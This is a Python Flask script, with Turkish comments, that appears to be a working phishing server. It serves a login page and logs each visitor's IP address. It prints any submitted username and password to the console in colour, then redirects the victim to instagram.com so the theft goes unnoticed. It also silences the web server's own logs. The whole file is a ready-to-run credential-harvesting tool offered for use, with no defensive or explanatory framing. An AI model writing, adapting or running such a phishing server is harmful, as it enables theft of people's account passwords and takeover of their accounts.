from flask import Flask, request, render_template, redirect
from datetime import datetime
import socket
from werkzeug.serving import make_server
import threading
import logging
from colorama import init, Fore, Style

# colorama'yı başlat (Windows için gerekli)
init(autoreset=True)

# Werkzeug loglarını sustur
log = logging.getLogger('werkzeug')
log.setLevel(logging.CRITICAL)  # HİÇBİR log gelmesin

app = Flask(__name__)

def get_real_ip():
    x_forwarded_for = request.headers.get("X-Forwarded-For")
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0].strip()
        return ip
    return request.remote_addr

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

@app.route('/', methods=['GET', 'POST'])
def login():
    ip_address = get_real_ip()

    if request.method == 'GET':
        print(Fore.CYAN + f"{ip_address} ip adresli cihaz siteye giriş yaptı.")
        return render_template("login.html")

    elif request.method == 'POST':
        username = request.form.get('kullanici', '')
        password = request.form.get('sifre', '')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(Fore.MAGENTA + "\n---------- FORM GÖNDERİLDİ ----------")
        print(Fore.YELLOW + f"IP Adres: {ip_address}")
        print(Fore.GREEN + f"Kullanıcı adı: {username}")
        print(Fore.RED + f"Şifre: {password}")
        print(Fore.BLUE + f"Tarih: {timestamp}")
        print(Fore.MAGENTA + "-------------------------------------\n")

        return redirect("https://www.instagram.com")

# Flask'ı sessizce çalıştırmak için threading + make_server
class ServerThread(threading.Thread):
    def __init__(self, app, host, port):
        threading.Thread.__init__(self)
        self.srv = make_server(host, port, app)
        self.ctx = app.app_context()
        self.ctx.push()

    def run(self):
        self.srv.serve_forever()

if __name__ == '__main__':
    local_ip = get_local_ip()
    port = 8080

    print(Fore.GREEN + f"Uygulama başlatıldı: http://{local_ip}:{port}\n")

    server = ServerThread(app, host='0.0.0.0', port=port)
    server.start()
